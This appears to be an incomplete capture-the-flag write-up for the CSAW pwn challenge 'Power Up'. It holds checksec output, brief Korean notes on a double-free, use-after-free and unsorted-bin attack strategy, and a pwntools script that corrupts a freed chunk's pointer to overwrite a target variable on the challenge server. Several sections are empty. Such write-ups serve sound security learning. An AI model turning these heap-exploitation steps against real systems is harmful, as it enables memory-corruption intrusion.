# Power Up - CSAW
## Challenge Info
- Date: 2025
- CTF Name: CSAW
- Category: pwn
- Difficulty (subjective): easy/medium/hard
- Points:
- Provided Files: chal(ELF)
- tools:
## Brief Description
## Initial Analysis
### Environment
``` sh
checksec chal
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### Code
## Vulnerability
## Exploit
### Strategy
Double Free Bug -> create module 로직을 보면 할당 크기가 엄청 커야 하는데 이러면 tcache를 안 씀, 따라서 Unsorted Bin Attack (또는 Unsorted Bin Poisoning) 활용  
Use After Free -> 이건 가능
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from EBP |
| --- | --- |
### payload
``` python
from pwn import *

p = remote('chals.ctf.csaw.io', 21005)

MODULE_SIZE = 4096
energy_addr = 0x00000000004040c0
modules_addr = 0x0000000000404060

def createModule(idx, size, data) :
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)
    print(p.recvline().decode().strip())

def deleteModule(idx) :
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())
    print(p.recvline().decode().strip())

def editModule(idx, data) :
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Data: ', data)
    print(p.recvline().decode().strip())

def power_up():
    p.sendlineafter(b'>> ', b'4')

# DFB 
createModule(0, MODULE_SIZE, b'A') 
createModule(1, MODULE_SIZE, b'B') 
deleteModule(0) # main_arena <- A

target_addr = energy_addr - 0x10
payload = p64(0) + p64(target_addr)
editModule(0, payload) # main_arena <- target_addr

createModule(2, MODULE_SIZE, b"trigger chunk")

power_up()

# interactive
p.interactive() 
```
